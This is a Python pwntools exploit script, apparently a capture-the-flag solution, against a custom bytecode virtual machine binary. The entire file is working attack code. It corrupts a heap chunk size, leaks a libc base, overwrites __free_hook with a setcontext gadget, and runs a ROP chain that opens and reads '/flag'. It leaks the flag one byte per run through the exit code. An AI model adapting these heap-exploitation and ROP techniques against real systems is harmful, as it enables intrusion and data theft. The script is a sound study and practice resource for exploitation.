from pwn import *

context.arch="amd64"

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def push_code(code):
    padding = 0 if (len(code)%8 == 0) else 8 - (len(code)%8)
    c = code+p8(instr["nop"])*padding   # align 8
    push_count = len(c)/8
    sc = (p8(instr["push"])+p8(1)+p64(0x21))*(0xf6-push_count)
    for i in range(push_count-1,-1,-1):
        sc += p8(instr["push"])+p8(1)+p64(u64(c[i*8:i*8+8]))
    return sc


def main(host,port=6001):
    global p
    if host:
        pass
    else:
        pass
        # debug(0x000000000000F66)
    flag = ''
    for i in range(0x40):
        #p = remote(host,port)
        p = process('./vm')
        code = p8(instr["mov"])+p8(8)+p8(0)+p8(9)           # mov r0,rbp
        code += p8(instr["add"])+p8(1)+p8(1)+p64(0x701)     # add r1,0x701
        code += p8(instr["sub"])+p8(1)+p8(0)+p64(0x808)     # sub r0,0x800
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1 ; overwrite chunk size
        code += p8(instr["alloc"])+p32(0x400)               # alloc(0x400) ; free chunk
        code += p8(instr["add"])+p8(1)+p8(0)+p64(8)         # add r0,0x8
        code += p8(instr["mov"])+p8(16)+p8(2)+p8(0)         # mov r2,[r0]
        code += p8(instr["sub"])+p8(1)+p8(2)+p64(0x3ec140)  # sub r2,0x3ec140 ; r2 --> libc_base
        code += p8(instr["mov"])+p8(8)+p8(3)+p8(2)          # mov r3,r2
        code += p8(instr["add"])+p8(1)+p8(3)+p64(libc.symbols["__free_hook"])       
                                                            # add r3,libc.symbols["__free_hook"]
        code += p8(instr["mov"])+p8(8)+p8(4)+p8(2)          # mov r4,r2
        code += p8(instr["add"])+p8(1)+p8(4)+p64(libc.symbols["setcontext"]+0x35)
                                                            # add r4,libc.symbols["setcontext"]+0x35
        code += p8(instr["mov"])+p8(32)+p8(3)+p8(4)         # mov [r3],r4 ; overwrite chunk size


        code += p8(instr["mov"])+p8(1)+p8(1)+p64(u64("/flag".ljust(8,"\x00")))
                                                            # mov r1,'/flag'
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1 

        code += p8(instr["mov"])+p8(8)+p8(1)+p8(0)          # mov r1,r0
        code += p8(instr["add"])+p8(1)+p8(0)+p64(0x68)      # add r0,0x68
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1   # rdi

        code += p8(instr["add"])+p8(1)+p8(0)+p64(0x10)      # add r0,0x10
        code += p8(instr["add"])+p8(1)+p8(1)+p64(0x300)     # add r1,0x300
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1   # rbp


        code += p8(instr["add"])+p8(1)+p8(0)+p64(0x28)      # add r0,0x28
        code += p8(instr["add"])+p8(1)+p8(1)+p64(0xa8)      # add r1,0x200
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1   # rsp

        code += p8(instr["add"])+p8(1)+p8(0)+p64(0x8)       # add r0,0x8
        code += p8(instr["mov"])+p8(8)+p8(3)+p8(2)          # mov r3,r2
        code += p8(instr["add"])+p8(1)+p8(3)+p64(0x439c8)   # add r3,offset
        code += p8(instr["mov"])+p8(32)+p8(0)+p8(3)         # mov [r0],r3   # rcx
        # 0x00000000000d3d8a: ret;
        # 0x00000000000a17e0: pop rdi; ret; 
        # 0x00000000001306d9: pop rdx; pop rsi; ret;
        # 0x00000000000439c8: pop rax; ret;
        # 0x00000000000d2975: syscall; ret;
        # 0x000000000002f128: mov rax, qword ptr [rsi + rax*8 + 0x80]; ret;
        # 0x000000000012188f: mov rdi, rax; mov eax, 0x3c; syscall;
        ret = 0x00000000000d3d8a
        p_rdi = 0x00000000000a17e0
        p_rdx_rsi = 0x00000000001306d9
        p_rax = 0x00000000000439c8
        syscall_ret = 0x00000000000d2975

        buf = 0x3ec000
        payload = [
            ret,p_rax,2,p_rdx_rsi,0,0,syscall_ret,
            p_rdi,0,p_rdx_rsi,0x80,buf,p_rax,0,syscall_ret,
            p_rax,0,p_rdx_rsi,0,buf-0x80+i,0x2f128,0x12188f
        ]

        code += p8(instr["mov"])+p8(8)+p8(0)+p8(1)          # mov r0,r1 

        for value in payload:
            if value < 0x100:
                code += p8(instr["mov"])+p8(1)+p8(1)+p64(value)     # mov r1,value
                code += p8(instr["mov"])+p8(32)+p8(0)+p8(1)         # mov [r0],r1
            else:           
                code += p8(instr["mov"])+p8(8)+p8(3)+p8(2)          # mov r3,r2
                code += p8(instr["add"])+p8(1)+p8(3)+p64(value)     # add r3,offset
                code += p8(instr["mov"])+p8(32)+p8(0)+p8(3)         # mov [r0],r3
            code += p8(instr["add"])+p8(1)+p8(0)+p64(0x8)           # add r0,0x8


        code += p8(instr["alloc"])+p32(0x200)               # alloc(0x200) ; trigger free
        code = push_code(code)

        p.recvuntil("code: ")
        p.send(code.ljust(0xf6d,p8(instr["nop"]))+p8(instr["jmp"])+p8(0xf1)+p8(instr["nop"])*0x90+'\xff')

        p.recvuntil("code: ")

        flag += chr(int(p.recv(),16))
        info(flag)

        p.close()

        # pause()

        if flag[-1] == '}':
            break;

if __name__ == "__main__":
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
    elf = ELF("./vm",checksec=False)
    instr = {"add":0,"sub":1,"mul":2,"div":3,"mov":4,"jsr":5,"and":6,"xor":7,"or":8,"not":9,"push":10,"pop":11,"jmp":12,"alloc":13,"nop":14}
    main(args['REMOTE'])

